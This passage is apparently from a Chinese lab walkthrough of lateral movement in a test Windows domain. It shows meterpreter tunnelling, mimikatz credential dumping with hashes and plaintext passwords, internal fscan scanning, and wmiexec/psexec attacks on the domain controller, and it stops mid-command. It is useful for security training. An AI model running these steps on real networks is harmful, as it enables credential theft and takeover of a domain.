ffff:ffff:ffff:ffff::\n</code></pre>\n<h2>搭建隧道</h2>\n<p>需要搭建隧道通到<code>kali</code>方便进行信息收集</p>\n<p>使用<code>MSF</code>的<code>socks_proxy</code></p>\n<pre><code class=\"hljs language-python\">meterpreter > bg\n[*] Backgrounding session <span class=\"hljs-number\">4.</span>..\nmsf6 exploit(multi/handler) > use auxiliary/server/socks_proxy \nmsf6 auxiliary(server/socks_proxy) > <span class=\"hljs-built_in\">set</span> version <span class=\"hljs-number\">5</span>\nmsf6 auxiliary(server/socks_proxy) > run\n[*] Auxiliary module running <span class=\"hljs-keyword\">as</span> background job <span class=\"hljs-number\">0.</span>\n</code></pre>\n<p>添加路由</p>\n<pre><code class=\"hljs language-python\">meterpreter > run post/multi/manage/autoroute \n\n[*] Running module against WIN7\n[*] Searching <span class=\"hljs-keyword\">for</span> subnets to autoroute.\n[+] Route added to subnet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span> <span class=\"hljs-keyword\">from</span> host<span class=\"hljs-string\">'s routing table.\n[+] Route added to subnet 192.168.183.0/255.255.255.0 from host'</span>s routing table.\n[+] Route added to subnet <span class=\"hljs-number\">169.254</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span> <span class=\"hljs-keyword\">from</span> Bluetooth vc6.\n</code></pre>\n<p><code>kali</code>设置<code>proxychain</code></p>\n<pre><code class=\"hljs language-python\">vim /etc/proxychains4.conf\n\nsocks5  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>       <span class=\"hljs-number\">1080</span>\n</code></pre>\n<p>测试是否成功，搭建成功</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~/Desktop/test/ATTCK5  proxychains4 curl <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.136</span>\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.136</span>:<span class=\"hljs-number\">80</span>  ...  OK\n&#x3C;style <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/css\"</span>>*{ padding: <span class=\"hljs-number\">0</span>; margin: <span class=\"hljs-number\">0</span>; } .think_default_text{ padding: 4px 48px;} a{color:<span class=\"hljs-comment\">#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: \"Century Gothic\",\"Microsoft yahei\"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&#x3C;/style>&#x3C;div style=\"padding: 24px 48px;\"> &#x3C;h1>:)&#x3C;/h1>&#x3C;p> ThinkPHP V5&#x3C;br/>&#x3C;span style=\"font-size:30px\">十年磨一剑 - 为API开发设计的高性能框架&#x3C;/span>&#x3C;/p>&#x3C;span style=\"font-size:22px;\">[ V5.0 版本由 &#x3C;a href=\"http://www.qiniu.com\" target=\"qiniu\">七牛云&#x3C;/a> 独家赞助发布 ]&#x3C;/span>&#x3C;/div>&#x3C;script type=\"text/javascript\" src=\"https://tajs.qq.com/stats?sId=9347272\" charset=\"UTF-8\">&#x3C;/script>&#x3C;script type=\"text/javascript\" src=\"https://e.topthink.com/Public/static/client.js\">&#x3C;/script>&#x3C;think id=\"ad_bd568ce7058a1091\">&#x3C;/think></span>\n</code></pre>\n<h2>信息收集</h2>\n<p>加载<code>mimikatz</code></p>\n<pre><code class=\"hljs language-python\">meterpreter > load kiwi\nLoading extension kiwi...\n  .<span class=\"hljs-comment\">#####.   mimikatz 2.2.0 20191125 (x64/windows)</span>\n .<span class=\"hljs-comment\">## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)</span>\n <span class=\"hljs-comment\">## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>\n <span class=\"hljs-comment\">## \\ / ##       > http://blog.gentilkiwi.com/mimikatz</span>\n <span class=\"hljs-string\">'## v ##'</span>        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  <span class=\"hljs-string\">'#####'</span>         > http://pingcastle.com / http://mysmartlogon.com  ***/\n\nSuccess.\n</code></pre>\n<p>挂在<code>SYSTEM</code>用户的进程下</p>\n<pre><code class=\"hljs language-python\">meterpreter > ps                                                                                                  \n\nProcess <span class=\"hljs-type\">List</span>             \n============                     \n                                                         \n PID   PPID  Name               Arch  Session  User                          Path\n  ---   ----  ----               ----  -------  ----                          ----                           \n <span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>     [System Process]                                                                                                                                                                                                       \n <span class=\"hljs-number\">4</span>     <span class=\"hljs-number\">0</span>     System             x64   <span class=\"hljs-number\">0</span>                                                                           \n <span class=\"hljs-number\">252</span>   <span class=\"hljs-number\">4</span>     smss.exe           x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           \\SystemRoot\\System32\\smss.exe  \n <span class=\"hljs-number\">336</span>   <span class=\"hljs-number\">328</span>   csrss.exe          x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe                                                                                                                          \n <span class=\"hljs-number\">352</span>   <span class=\"hljs-number\">468</span>   svchost.exe        x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\system32\\svchost.exe\n <span class=\"hljs-number\">388</span>   <span class=\"hljs-number\">328</span>   wininit.exe        x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\wininit.exe \n <span class=\"hljs-number\">400</span>   <span class=\"hljs-number\">380</span>   csrss.exe          x64   <span class=\"hljs-number\">1</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe\n <span class=\"hljs-number\">468</span>   <span class=\"hljs-number\">388</span>   services.exe       x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\services.exe\n <span class=\"hljs-number\">476</span>   <span class=\"hljs-number\">388</span>   lsass.exe          x64   <span class=\"hljs-number\">0</span>        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\lsass.exe  \n</code></pre>\n<pre><code class=\"hljs language-python\">meterpreter > migrate <span class=\"hljs-number\">476</span>\n[*] Migrating <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">1568</span> to <span class=\"hljs-number\">476.</span>..\n[*] Migration completed successfully.    \n</code></pre>\n<p>使用<code>mimikatz</code>获得密码</p>\n<pre><code class=\"hljs language-python\">meterpreter > creds_all                                                                                                                                                                                                             \n[+] Running <span class=\"hljs-keyword\">as</span> SYSTEM                                                                                                                                                                                                               \n[*] Retrieving <span class=\"hljs-built_in\">all</span> credentials                           \nmsv credentials                                          \n===============\nUsername       Domain  LM                                NTLM                              SHA1             \n--------       ------  --                                ----                              ----             \nAdministrator  SUN     c8c42d085b5e3da2e9260223765451f1  e8bea972b3549868cecd667a64a6ac46  3688af445e35efd8a4d4e0a9eb90b754a2f3a4ee                                                                                                 \nWIN7$          SUN                                       8e7d680b96dac27b50e781098dacb63b  c7a665b653036a52a350263fdacd163703a11a9a                                                                                                 \nleo            SUN     b73a13e9b7832a35aad3b435b51404ee  afffeba176210fad4628f0524bfe1942  fa83a92197d9896cb41463b7a917528b4009c650                                                                                                 \n                                                                                                                  \nwdigest credentials                                                                                               \n===================                                                                                               \n                                                                                                                  \nUsername       Domain  Password                                                                                   \n--------       ------  --------                                                                                   \n(null)         (null)  (null)                                                                                                                                                                                                       \nAdministrator  SUN     dc123.com                                                                                  \nWIN7$          SUN     <span class=\"hljs-number\">96</span> d1 ff bb a7 5d 4d <span class=\"hljs-number\">85</span> <span class=\"hljs-number\">54</span> f2 1c 5a <span class=\"hljs-number\">58</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">69</span> 4f 9e <span class=\"hljs-number\">21</span> a7 6e 3e <span class=\"hljs-number\">50</span> <span class=\"hljs-number\">43</span> b6 e6 6c 8b <span class=\"hljs-number\">93</span> <span class=\"hljs-number\">28</span> bc <span class=\"hljs-number\">32</span> 7c f9 c3 <span class=\"hljs-number\">62</span> aa a0 e0 7c ba <span class=\"hljs-number\">11</span> f9 <span class=\"hljs-number\">00</span> d1 <span class=\"hljs-number\">58</span> f8 d1 f0 cc f7 a4 e7 c8 d8 5f <span class=\"hljs-number\">72</span> <span class=\"hljs-number\">35</span> 6d bd f5 fa <span class=\"hljs-number\">67</span> 09 <span class=\"hljs-number\">27</span> 4f <span class=\"hljs-number\">53</span> 8f <span class=\"hljs-number\">28</span>  \n                        <span class=\"hljs-number\">25</span> <span class=\"hljs-number\">80</span> ab f9 2b 6c aa ce a4 b5 7d 06 <span class=\"hljs-number\">26</span> 6e 07 8e 9f <span class=\"hljs-number\">21</span> 9b <span class=\"hljs-number\">43</span> cf <span class=\"hljs-number\">54</span> <span class=\"hljs-number\">61</span> <span class=\"hljs-number\">78</span> 09 <span class=\"hljs-number\">58</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">87</span> <span class=\"hljs-number\">29</span> 09 a2 c8 5c 2d f1 a5 <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">37</span> 5e c6 ee 3c <span class=\"hljs-number\">26</span> 6d 0d b5 <span class=\"hljs-number\">54</span> af <span class=\"hljs-number\">70</span> f5 <span class=\"hljs-number\">38</span> c0 4f 2c 4a d6 0b <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">95</span> <span class=\"hljs-number\">12</span> 9a e8 <span class=\"hljs-number\">73</span> c7 b3 ae <span class=\"hljs-number\">97</span> <span class=\"hljs-number\">1</span>  \n                       <span class=\"hljs-number\">5</span> dd d5 <span class=\"hljs-number\">96</span> <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">24</span> d9 <span class=\"hljs-number\">47</span> 01 f1 8a 5c 04 ac d3 1a <span class=\"hljs-number\">43</span> 7a 9e 5c f0 c9 ed <span class=\"hljs-number\">47</span> 4f 7a 6a 9c c6 <span class=\"hljs-number\">93</span> f6 <span class=\"hljs-number\">16</span> 0c da <span class=\"hljs-number\">16</span> d6 e9 3a <span class=\"hljs-number\">88</span> 02 6b e1 <span class=\"hljs-number\">67</span> 8b 1a d5 e3 <span class=\"hljs-number\">93</span> <span class=\"hljs-number\">36</span> ec 01 c9 <span class=\"hljs-number\">60</span> 2c d2 b0 <span class=\"hljs-number\">43</span> <span class=\"hljs-number\">46</span> 0b <span class=\"hljs-number\">86</span> 2a 3c 3b <span class=\"hljs-number\">42</span> 0a c9 b8   \n                       ae <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">56</span> c3 2e 8e 9d db 5c 7b a5 4a <span class=\"hljs-number\">92</span> d2 <span class=\"hljs-number\">28</span> f9 e3 f1 ca 1e 1d <span class=\"hljs-number\">30</span> b5 <span class=\"hljs-number\">85</span> fe db <span class=\"hljs-number\">60</span> <span class=\"hljs-number\">85</span> 2d a0 ee 08 <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">88</span> <span class=\"hljs-number\">73</span> <span class=\"hljs-number\">69</span> 2a                                                                                               \nleo            SUN     <span class=\"hljs-number\">123.</span>com                                                                                    \n                                                                                                                  \ntspkg credentials                                                                                                 \n=================                                                                                                                                                                                                                   \n                                                                                                                  \nUsername       Domain  Password                                                                                                                                                                                                     \n--------       ------  --------                                                                                   \nAdministrator  SUN     dc123.com                                                                                                                                                                                                    \nleo            SUN     <span class=\"hljs-number\">123.</span>com                                                                                    \n                                                                                                                  \nkerberos credentials                                                                                                                                                                                                                \n====================                                                                                              \n                                                                                                                  \nUsername       Domain   Password                                                                                  \n--------       ------   --------                                                                                  \n(null)         (null)   (null)                                                                                    \nAdministrator  SUN.COM  dc123.com                        \nleo            SUN.COM  <span class=\"hljs-number\">123.</span>com\nwin7$          SUN.COM  <span class=\"hljs-number\">96</span> d1 ff bb a7 5d 4d <span class=\"hljs-number\">85</span> <span class=\"hljs-number\">54</span> f2 1c 5a <span class=\"hljs-number\">58</span> <span class=\"hljs-number\">20</span> <span class=\"hljs-number\">69</span> 4f 9e <span class=\"hljs-number\">21</span> a7 6e 3e <span class=\"hljs-number\">50</span> <span class=\"hljs-number\">43</span> b6 e6 6c 8b <span class=\"hljs-number\">93</span> <span class=\"hljs-number\">28</span> bc <span class=\"hljs-number\">32</span> 7c f9 c3 <span class=\"hljs-number\">62</span> aa a0 e0 7c ba <span class=\"hljs-number\">11</span> f9 <span class=\"hljs-number\">00</span> d1 <span class=\"hljs-number\">58</span> f8 d1 f0 cc f7 a4 e7 c8 d8 5f <span class=\"hljs-number\">72</span> <span class=\"hljs-number\">35</span> 6d bd f5 fa <span class=\"hljs-number\">67</span> 09 <span class=\"hljs-number\">27</span> 4f <span class=\"hljs-number\">53</span> 8f <span class=\"hljs-number\">2</span>  \n                        <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">25</span> <span class=\"hljs-number\">80</span> ab f9 2b 6c aa ce a4 b5 7d 06 <span class=\"hljs-number\">26</span> 6e 07 8e 9f <span class=\"hljs-number\">21</span> 9b <span class=\"hljs-number\">43</span> cf <span class=\"hljs-number\">54</span> <span class=\"hljs-number\">61</span> <span class=\"hljs-number\">78</span> 09 <span class=\"hljs-number\">58</span> <span class=\"hljs-number\">14</span> <span class=\"hljs-number\">87</span> <span class=\"hljs-number\">29</span> 09 a2 c8 5c 2d f1 a5 <span class=\"hljs-number\">23</span> <span class=\"hljs-number\">37</span> 5e c6 ee 3c <span class=\"hljs-number\">26</span> 6d 0d b5 <span class=\"hljs-number\">54</span> af <span class=\"hljs-number\">70</span> f5 <span class=\"hljs-number\">38</span> c0 4f 2c 4a d6 0b <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">95</span> <span class=\"hljs-number\">12</span> 9a e8 <span class=\"hljs-number\">73</span> c7 b3 ae <span class=\"hljs-number\">97</span>  \n                         <span class=\"hljs-number\">15</span> dd d5 <span class=\"hljs-number\">96</span> <span class=\"hljs-number\">30</span> <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">24</span> d9 <span class=\"hljs-number\">47</span> 01 f1 8a 5c 04 ac d3 1a <span class=\"hljs-number\">43</span> 7a 9e 5c f0 c9 ed <span class=\"hljs-number\">47</span> 4f 7a 6a 9c c6 <span class=\"hljs-number\">93</span> f6 <span class=\"hljs-number\">16</span> 0c da <span class=\"hljs-number\">16</span> d6 e9 3a <span class=\"hljs-number\">88</span> 02 6b e1 <span class=\"hljs-number\">67</span> 8b 1a d5 e3 <span class=\"hljs-number\">93</span> <span class=\"hljs-number\">36</span> ec 01 c9 <span class=\"hljs-number\">60</span> 2c d2 b0 <span class=\"hljs-number\">43</span> <span class=\"hljs-number\">46</span> 0b <span class=\"hljs-number\">86</span> 2a 3c 3b <span class=\"hljs-number\">42</span> 0a c9   \n                        b8 ae <span class=\"hljs-number\">28</span> <span class=\"hljs-number\">56</span> c3 2e 8e 9d db 5c 7b a5 4a <span class=\"hljs-number\">92</span> d2 <span class=\"hljs-number\">28</span> f9 e3 f1 ca 1e 1d <span class=\"hljs-number\">30</span> b5 <span class=\"hljs-number\">85</span> fe db <span class=\"hljs-number\">60</span> <span class=\"hljs-number\">85</span> 2d a0 ee 08 <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">88</span> <span class=\"hljs-number\">73</span> <span class=\"hljs-number\">69</span> 2a \n</code></pre>\n<p><code>Administrator</code>  <code>dc123.com</code>  以及 <code>leo</code>  <code>123.com</code></p>\n<p>上传<code>fscan</code>进行探测</p>\n<pre><code class=\"hljs language-python\">meterpreter > cd C:/\n\nmeterpreter > upload ~/Desktop/Tools/fscan.exe\n[*] Uploading  : /root/Desktop/Tools/fscan.exe -> fscan.exe\n[*] Uploaded <span class=\"hljs-number\">8.00</span> MiB of <span class=\"hljs-number\">8.33</span> MiB (<span class=\"hljs-number\">96.02</span>%): /root/Desktop/Tools/fscan.exe -> fscan.exe\n[*] Uploaded <span class=\"hljs-number\">8.33</span> MiB of <span class=\"hljs-number\">8.33</span> MiB (<span class=\"hljs-number\">100.0</span>%): /root/Desktop/Tools/fscan.exe -> fscan.exe\n[*] Completed  : /root/Desktop/Tools/fscan.exe -> fscan.exe\n\nmeterpreter > ls\nListing: C:\\\n============\n\nMode              Size     <span class=\"hljs-type\">Type</span>  Last modified              Name\n----              ----     ----  -------------              ----\n040777/rwxrwxrwx  <span class=\"hljs-number\">0</span>        <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2020</span>-03-04 <span class=\"hljs-number\">12</span>:06:<span class=\"hljs-number\">50</span> -0500  $Recycle.Bin\n<span class=\"hljs-number\">100444</span>/r--r--r--  <span class=\"hljs-number\">8192</span>     fil   <span class=\"hljs-number\">2020</span>-03-04 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">42</span>:03 -0500  BOOTSECT.BAK\n040777/rwxrwxrwx  <span class=\"hljs-number\">4096</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2020</span>-03-04 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">42</span>:03 -0500  Boot\n040777/rwxrwxrwx  <span class=\"hljs-number\">0</span>        <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2009</span>-07-<span class=\"hljs-number\">14</span> 01:08:<span class=\"hljs-number\">56</span> -0400  Documents <span class=\"hljs-keyword\">and</span> Settings\n040777/rwxrwxrwx  <span class=\"hljs-number\">0</span>        <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2009</span>-07-<span class=\"hljs-number\">13</span> <span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">20</span>:08 -0400  PerfLogs\n040555/r-xr-xr-x  <span class=\"hljs-number\">4096</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">18</span> 09:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">47</span> -0500  Program Files\n040555/r-xr-xr-x  <span class=\"hljs-number\">4096</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2009</span>-07-<span class=\"hljs-number\">14</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">57</span>:06 -0400  Program Files (x86)\n040777/rwxrwxrwx  <span class=\"hljs-number\">4096</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">18</span> 09:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">46</span> -0500  ProgramData\n040777/rwxrwxrwx  <span class=\"hljs-number\">0</span>        <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2020</span>-03-04 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">56</span> -0500  Recovery\n040777/rwxrwxrwx  <span class=\"hljs-number\">4096</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">18</span> 09:<span class=\"hljs-number\">50</span>:09 -0500  System Volume Information\n040555/r-xr-xr-x  <span class=\"hljs-number\">4096</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2020</span>-03-04 <span class=\"hljs-number\">12</span>:07:<span class=\"hljs-number\">56</span> -0500  Users\n040777/rwxrwxrwx  <span class=\"hljs-number\">16384</span>    <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> 08:<span class=\"hljs-number\">35</span>:<span class=\"hljs-number\">48</span> -0500  Windows\n<span class=\"hljs-number\">100444</span>/r--r--r--  <span class=\"hljs-number\">383786</span>   fil   <span class=\"hljs-number\">2010</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">23</span>:<span class=\"hljs-number\">51</span> -0500  bootmgr\n<span class=\"hljs-number\">100777</span>/rwxrwxrwx  <span class=\"hljs-number\">8736768</span>  fil   <span class=\"hljs-number\">2025</span>-02-<span class=\"hljs-number\">19</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">12</span> -0500  fscan.exe\n<span class=\"hljs-number\">000000</span>/---------  <span class=\"hljs-number\">0</span>        fif   <span class=\"hljs-number\">1969</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">31</span> <span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> -0500  pagefile.sys\n040777/rwxrwxrwx  <span class=\"hljs-number\">8192</span>     <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2020</span>-03-04 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">52</span> -0500  phpStudy\n</code></pre>\n<pre><code class=\"hljs language-python\">C:\\>fscan.exe -h <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">24</span>                                                                                 \n┌──────────────────────────────────────────────┐                                                                  \n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n                                                         \n[2025-02-19 23:13:52] [INFO] 暴力破解线程数: 1\n[2025-02-19 23:13:52] [INFO] 开始信息扫描\n[2025-02-19 23:13:52] [INFO] CIDR范围: 192.168.138.0-192.168.138.255                                              \n[2025-02-19 23:13:52] [INFO] 生成IP范围: 192.168.138.0.%!d(string=192.168.138.255) - %!s(MISSING).%!d(MISSING)    \n[2025-02-19 23:13:52] [INFO] 解析CIDR 192.168.138.1/24 -> IP范围 192.168.138.0-192.168.138.255                    \n[2025-02-19 23:13:52] [INFO] 最终有效主机数量: 256\n[2025-02-19 23:13:52] [INFO] 开始主机扫描\n[2025-02-19 23:13:52] [SUCCESS] 目标 192.168.138.136 存活 (ICMP)                                                  \n[2025-02-19 23:13:52] [SUCCESS] 目标 192.168.138.138 存活 (ICMP)                                                  \n[2025-02-19 23:13:58] [INFO] 存活主机数量: 3\n[2025-02-19 23:13:58] [INFO] 有效端口数量: 233\n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.136:80                                                       \n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.138:135                                                      \n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.136:135                                                      \n[2025-02-19 23:13:58] [SUCCESS] 端口开放 192.168.138.138:88                                                       \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:139                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.136:139                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:389                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.138:445                                                      \n[2025-02-19 23:13:59] [SUCCESS] 端口开放 192.168.138.136:445                                                      \n[2025-02-19 23:14:03] [SUCCESS] 服务识别 192.168.138.136:80 => [http]                                             \n[2025-02-19 23:14:03] [SUCCESS] 服务识别 192.168.138.138:88 =>                                                    \n[2025-02-19 23:14:04] [SUCCESS] 端口开放 192.168.138.136:3306                                                     \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[E.j Host '</span>win7.sun.com<span class=\"hljs-string\">' is not allowed to connect to this MySQL server]                                               \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:139 =>  Banner:[.]                                       \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:139 =>  Banner:[.]                                       \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: sun.com, Site: Default-First-Site-Name                                                \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.138:445 =>                                                   \n[2025-02-19 23:14:04] [SUCCESS] 服务识别 192.168.138.136:445 =>                                                   \n[2025-02-19 23:15:03] [SUCCESS] 服务识别 192.168.138.138:135 =>                                                   \n[2025-02-19 23:15:03] [SUCCESS] 服务识别 192.168.138.136:135 =>                                                   \n[2025-02-19 23:15:03] [INFO] 存活端口数量: 13   \n[2025-02-19 23:15:03] [INFO] 开始漏洞扫描       \n[2025-02-19 23:15:03] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                                              \n[2025-02-19 23:15:04] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.138.136                                \n主机名: win7                                  \n发现的网络接口:                          \n   IPv4地址:                                                                                                      \n      └─ 192.168.138.136                                                                                          \n      └─ 192.168.183.134                                                                                          \n[2025-02-19 23:15:04] [SUCCESS] 发现漏洞 192.168.138.136 [Windows 7 Professional 7601 Service Pack 1] MS17-010    \n[2025-02-19 23:15:04] [SUCCESS] 网站标题 http://192.168.138.136    状态码:200 长度:931    标题:无标题             \n[2025-02-19 23:15:04] [SUCCESS] NetInfo 扫描结果                                                                                                                                                 \n主机名: DC                                                                                                        \n发现的网络接口:                                                                                                   \n   IPv4地址:                                                                                                      \n      └─ 192.168.138.138                                                                                                                                                                                                            \n[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.1   WORKGROUP\\DESKTOP-OO4DPSM     \n[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.136 win7.sun.com                        Windows 7 Professional 7601 Service Pack 1                                                                                              \n[2025-02-19 23:15:04] [SUCCESS] 发现漏洞 192.168.138.138 [Windows Server 2008 HPC Edition 7600] MS17-010\n[2025-02-19 23:15:04] [SUCCESS] NetBios 192.168.138.138 DC:DC.sun.com                    Windows Server 2008 HPC Edition 7600                                                       \n[2025-02-19 23:15:16] [SUCCESS] 目标: http://192.168.138.136:80\n  漏洞类型: poc-yaml-thinkphp5-controller-rce\n  漏洞名称: \n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce\n[2025-02-19 23:15:16] [SUCCESS] 目标: http://192.168.138.136:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce                                                                                                                                               \n</span></code></pre>\n<p>看信息可以知道<code>DC</code>是<code>192.168.138.138</code> ，域是<code>sun.com</code> ，并且开启<code>135</code>，<code>139</code>，<code>445</code></p>\n<h2>PTH</h2>\n<p>因为上面获得域用户，尝试<code>PTH</code></p>\n<p><code>wmiexec.exe</code>失败</p>\n<pre><code class=\"hljs language-python\">⚡ root@kali  ~  proxychains4 wmiexec.py sun.com/administrator:dc123.com@dc.sun.com -target-ip <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span> \n                                                                                                                  \n[proxychains] config file found: /etc/proxychains4.conf                                                           \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>                                            \n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>              \nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies                                             \n                                                                                                                  \n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>  ...  OK                                \n[*] SMBv2<span class=\"hljs-number\">.1</span> dialect used                                                                                          \n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">135</span>  ...  OK                                \n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  dc.sun.com:<span class=\"hljs-number\">49154</span> &#x3C;--socket error <span class=\"hljs-keyword\">or</span> timeout!                \n[-] Could <span class=\"hljs-keyword\">not</span> connect: [Errno <span class=\"hljs-number\">111</span>] Connection refused    \n</code></pre>\n<p><code>evil-winrm</code>失败</p>\n<pre><code class=\"hljs language-python\">同上\n</code></pre>\n<p><code>psexec.py</code>成功，成功了，拿下域控</p>\n<pre><code class=\"hljs language-python\"> ⚡ root@kali  ~  proxychains4 psexec.py administrator:dc123.com@<span class=\"hljs-number\">192.168</span><span 